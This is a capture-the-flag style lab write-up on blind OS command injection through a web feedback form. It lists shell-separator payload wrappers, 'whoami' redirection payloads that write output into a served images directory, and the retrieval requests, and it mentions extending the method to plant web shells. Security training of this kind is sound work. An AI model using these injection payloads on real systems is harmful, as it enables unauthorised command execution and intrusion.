## 1. Initial reconnaissance
Start on the main page and quickly found the feedback form at `/feedback`, which contained the usual fields:
- `name`
- `email`
- `subject`
- `message`

The HTML showed a `POST /feedback/submit` endpoint with a hidden CSRF token. The lab description indicated that command output isn’t returned in the response but that `/var/www/images/` is writable and served via the application. Inspecting the product page HTML revealed two image-loading patterns, for example:

```html
<img src="/resources/images/image.png">
<img src="/image?filename=image.jpg">
```

The second endpoint—`/image?filename=...`—looked like the intended exfiltration channel.

## 2. Testing methodology
Since the vulnerability is blind and output is not directly visible, we needed a way to determine:

1. Which parameter is vulnerable to OS command injection.
2. How to write command output into the writable images directory.

Intercept a `POST /feedback/submit` request and sent it to Intruder. Set up a **Sniper** attack with:

- Target parameters: `name`, `email`, `subject`, `message`.
- Payload positions: each parameter one at a time.
- Payload list: a set of command injection wrappers similar to:

  - `;<PAYLOAD>`  
  - `&<PAYLOAD>`  
  - `&&<PAYLOAD>`  
  - `|<PAYLOAD>`  
  - `||<PAYLOAD>`  
  - `` `<PAYLOAD>` ``  
  - `$('<PAYLOAD>')`  
  - Newline-prefixed variants, etc.

Define `<PAYLOAD>` as something benign initially (like `id` or `whoami`), and later as redirection to the images directory.

## 3. Payload construction
To exploit output redirection, use payloads of the form:

```bash
whoami > /var/www/images/test_file15.txt
$(whoami > /var/www/images/test_file16.txt)
```

and wrapp them with separators such as:

- `;whoami > /var/www/images/test_file15.txt`
- `$(whoami > /var/www/images/test_file16.txt)`

In the Intruder-like script, the logic systematically:

1. Iterate over each feedback parameter (`name`, `email`, `subject`, `message`).
2. Combine each parameter with all payload wrappers in `payload_base_list`.
3. Send each request with a valid CSRF token.
4. Use a counter to name files uniquely (`test_file1.txt`, `test_file2.txt`, …).

After firing the requests, attempt to retrieve the output by requesting candidate filenames from `/image`:

- `/image?filename=test_file1.txt`
- `/image?filename=test_file2.txt`
- … and so on.

Eventually, one of the filenames responded with HTTP 200 and a body similar to:

```text
peter-ID
```

This confirmed that `whoami` had successfully executed on the server and its output was written into `/var/www/images/`.

## 4. Completing the attack
Once identified a specific payload and parameter combination that produced a readable file, the steps to complete the lab were:

1. Submit a feedback request with a payload like:
   ```
   whoami > /var/www/images/test_file.txt
   ```
   inserted into the correct parameter (for example the `email` field) using a suitable wrapper such as `;` or `$()`.
2. Request:
   ```
   GET /image?filename=test_file.txt
   ```
3. Confirm the response contained the output of `whoami` (e.g. `peter-ID`).

This demonstrated that:
- We have a command execution on the server.
- It could exfiltrate command output through a writable static directory served by the application.

In a real-world environment, this primitive exfil method could be extended to write arbitrary files, such as web shells or backdoors, into the served directory, massively increasing the impact of the vulnerability.

## Results and observations

It is important to mix all combinations of possible payloads. If we pentest black-box and don’t see the source code, we never know how the application exactly serves files, what extensions are allowed and filtered, what exact path would work this time.

And we don't know what exact image endpoint is vulnerable.
This endpoint works:
(lab3-pic1)[link]

but this is not:
(lab3-pic2)[link]

what payload actually work:
(lab3-pic3)[link]
